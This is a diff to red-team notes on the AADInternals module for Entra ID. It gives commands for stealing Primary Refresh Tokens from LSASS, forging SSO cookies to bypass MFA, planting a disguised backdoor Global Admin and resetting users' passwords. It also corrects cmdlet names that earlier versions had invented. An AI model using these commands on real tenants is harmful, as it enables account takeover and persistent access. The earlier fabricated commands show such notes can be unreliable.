@@ -21,7 +21,7 @@ Get-Command -Module AADInternals | Measure-Object   # lists all available functi
 
 > [!note] **See also** — [[Services/Active Directory/Entra ID|Entra ID]] for the broader Entra/Azure AD attack methodology, MFA bypass, Conditional Access bypass, token abuse chains, and Graph API enumeration. This note covers the AADInternals module commands specifically. Also [[Services/Active Directory/ADFS|ADFS]] — `Export-AADIntADFSConfiguration`/`Export-AADIntADFSEncryptionKey`/`Export-AADIntADFSCertificates` (local + remote DKM) and `New-AADIntSAMLToken` for Golden SAML.
 
-> [!warning] **AADInternals cmdlet names drift hard between versions — verify on the box.** Functions get renamed or **removed** release to release (spraying, PTASpy, and the PRT-nonce flow that older guides show are **gone** from the current public module). Before relying on a command here, confirm it exists: `Get-Command -Module AADInternals -Verb Get,Invoke,New,Set | Select Name`, or `Get-Command -Module AADInternals *PRT*`. Corrections below reflect the current `Gerenios/AADInternals` master.
+> [!warning] **AADInternals cmdlet names drift hard between versions — verify on the box.** Functions get renamed or **removed** release to release (spraying, PTASpy, and the PRT-nonce flow that older guides show are **gone** from the current public module). Before relying on a command here, confirm it exists: `Get-Command -Module AADInternals -Verb Get,Invoke,New,Set | Select Name`, or `Get-Command -Module AADInternals *PRT*`. Corrections below reflect the current `Gerenios/AADInternals` master, **re-verified against aadinternals.com's function index 2026-09-27** — which also caught two more invented cmdlets: **`Add-AADIntRoleMembersByRoleName`** and **`Get-AADIntAccessTokenWithPRTToken`** (neither exists).
 
 ---
 
@@ -170,15 +170,16 @@ PRTs are issued to Azure AD-joined Windows devices. Stealing one = authenticate 
 
 ```powershell
 # PRT + session key come from LSASS — Mimikatz: privilege::debug ; sekurlsa::cloudap
-# (or extract on-box with AADInternals' own device functions: Get-AADIntUserPRTKeys)
+# (or extract on-box with AADInternals: Get-AADIntUserPRTKeys / Get-AADIntUserPRTKeysFromCloudAP)
 
 # Mint the SSO cookie (x-ms-RefreshTokenCredential) from the PRT + session key.
 # The nonce is fetched internally — the old Get-AADIntUserPRTNonce step is gone.
 $cookie = New-AADIntUserPRTToken -RefreshToken "<prt-base64>" -SessionKey "<hex-sessionkey>"
 # Set that value as the x-ms-RefreshTokenCredential cookie in a browser → portal.azure.com (rides the session, no MFA)
 
-# To exchange a PRT for an access token programmatically instead, use the PRT-token cmdlets:
-Get-Command -Module AADInternals *PRTToken*   # e.g. Get-AADIntAccessTokenWithPRTToken
+# The real PRT cmdlets are Get-AADIntUserPRTToken, New-AADIntUserPRTToken, and
+# New-AADIntBulkPRTToken — there is NO "Get-AADIntAccessTokenWithPRTToken".
+Get-Command -Module AADInternals *PRT*   # confirm the current set on-box
 ```
 
 ---
@@ -203,11 +204,17 @@ New-AADIntKerberosTicket `
 ## Backdooring
 
 ```powershell
-# Create a new user, then grant Global Admin.
-# NOTE: Add-AADIntGlobalAdmin does not exist — add to the role by its INTERNAL name,
-# which is "Company Administrator" (= Global Administrator in the portal).
+# Create a new user (New-AADIntUser is real).
 New-AADIntUser -UserPrincipalName backdoor@company.com -DisplayName "IT Support" -Password "P@ssw0rd123!"
-Add-AADIntRoleMembersByRoleName -RoleName "Company Administrator" -UserPrincipalName backdoor@company.com
+
+# Granting Global Admin: NEITHER Add-AADIntGlobalAdmin NOR Add-AADIntRoleMembersByRoleName
+# exists in the current public module (both were invented in older notes). Options:
+#  - Add the user to the Global Administrator role via MS Graph directly
+#    (roleTemplateId 62e90394-69f5-4237-9190-012177145e10), or confirm the current
+#    cmdlet on-box: Get-Command -Module AADInternals *Role*
+#  - For the Azure-RBAC root-elevation path, AADInternals DOES have (verified):
+Grant-AADIntAzureUserAccessAdminRole   # Global Admin -> User Access Administrator at root scope
+Set-AADIntAzureRoleAssignment          # then assign Owner/Contributor over subscriptions
 
 # Reset any user's password (bypasses MFA-protected self-service reset)
 Set-AADIntUserPassword -SourceAnchor "<immutable-id>" -Password "NewPass123!"
@@ -240,5 +247,5 @@ Read-AADIntAccessToken -AccessToken "<jwt>"
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-09-25*
-*Model: claude-opus-5*
+*Updated: 2026-09-27*
+*Model: claude-opus-4-8*
